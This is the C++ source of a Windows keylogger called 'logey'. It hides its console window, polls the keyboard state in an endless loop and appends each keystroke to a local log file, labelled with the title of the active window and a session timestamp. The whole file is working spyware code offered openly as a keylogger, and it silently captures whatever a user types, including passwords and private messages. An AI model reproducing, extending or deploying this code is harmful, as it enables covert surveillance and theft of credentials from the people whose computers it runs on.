// Logey.cpp : Defines the entry point for the console application.
//

#include "logey.h"

int main() {

	if (!DEBUG) hideConsole();

	createNewInstanceHeader("logey.log");
	string logFile = "logey.log";

	while (true) // infinite loop
	{
		for (int i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				keys(i, logFile.c_str());
			}
		}
		Sleep(10);
	}

	return 0;
}

void keys(int key, const char *filename) {

	FILE *OUTPUT_FILE;
	if (OUTPUT_FILE = fopen(filename, "a+")) {}
	else {
		cout << "Cannot open file for logging." << endl;
	}

	static string activeWindowTitle = "";

	char windowTitle[256];
	HWND activeWindow = GetForegroundWindow(); // get handle of currently active window
	GetWindowText(activeWindow, windowTitle, sizeof(windowTitle));

	if (activeWindowTitle != windowTitle)
	{
		fprintf(OUTPUT_FILE, "\n\nActive Window: %s\n\n", windowTitle);
		activeWindowTitle = windowTitle;
	}

	switch (key) {
	case VK_RETURN:
		cout << endl;
		fprintf(OUTPUT_FILE, "%s ", "\n");
		break;
	case VK_SHIFT:
		cout << "{SHIFT}";
		fprintf(OUTPUT_FILE, "%s ", "{SHIFT}");
		break;
	case VK_SPACE:
		cout << " ";
		fprintf(OUTPUT_FILE, "%s ", " ");
		break;
	case VK_BACK:
		cout << "{BACKSPACE}";
		fprintf(OUTPUT_FILE, "%s ", "{BACKSPACE}");
		break;
	case VK_CONTROL:
		cout << "{CONTROL}";
		fprintf(OUTPUT_FILE, "%s ", "{CONTROL}");
		break;
	case VK_TAB:
		cout << "{TAB}";
		fprintf(OUTPUT_FILE, "%s ", "{TAB}");
		break;
	case VK_ESCAPE:
		cout << "{ESCAPE}";
		fprintf(OUTPUT_FILE, "%s ", "{ESCAPE}");
		break;
	case VK_MENU:
		cout << "{ALT}";
		fprintf(OUTPUT_FILE, "%s ", "{ALT}");
		break;
	default:
		char x = findLetter(key);
		cout << x;
		int ascii = (int)x;
		fprintf(OUTPUT_FILE, "%c", ascii);
		break;
	}

	fclose(OUTPUT_FILE);
}

void hideConsole() {
	HWND hideConsole;
	AllocConsole();
	hideConsole = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hideConsole, 0);
}

char findLetter(int key) {
	switch (key) {
	case 48:
		return '0';
	case 49:
		return '1';
	case 50:
		return '2';
	case 51:
		return '3';
	case 52:
		return '4';
	case 53:
		return '5';
	case 54:
		return '6';
	case 55:
		return '7';
	case 56:
		return '8';
	case 57:
		return '9';
	case 65:
		return 'A';
	case 66:
		return 'B';
	case 67:
		return 'C';
	case 68:
		return 'D';
	case 69:
		return 'E';
	case 70:
		return 'F';
	case 71:
		return 'G';
	case 72:
		return 'H';
	case 73:
		return 'I';
	case 74:
		return 'J';
	case 75:
		return 'K';
	case 76:
		return 'L';
	case 77:
		return 'M';
	case 78:
		return 'N';
	case 79:
		return 'O';
	case 80:
		return 'P';
	case 81:
		return 'Q';
	case 82:
		return 'R';
	case 83:
		return 'S';
	case 84:
		return 'T';
	case 85:
		return 'U';
	case 86:
		return 'V';
	case 87:
		return 'W';
	case 88:
		return 'X';
	case 89:
		return 'Y';
	case 90:
		return 'Z';
	default: // If we don't know what it is, just return nothing
		return '.';
	}
}

void createNewInstanceHeader(char *filename) {
	time_t currentTime;
	time(&currentTime);

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(filename, "a+");

	fprintf(OUTPUT_FILE, "%s", "\n------------------");
	fprintf(OUTPUT_FILE, "%s %.2f", "\nlogey --- a Windows keylogger\nauthor: exler\nlicense: MIT\nVersion:", LOGEY_VERSION);
	fprintf(OUTPUT_FILE, "%s", "\n\nSession Timestamp: ");
	fprintf(OUTPUT_FILE, "%s", ctime(&currentTime));
	fprintf(OUTPUT_FILE, "%s", "\n------------------\n");

	fclose(OUTPUT_FILE);
}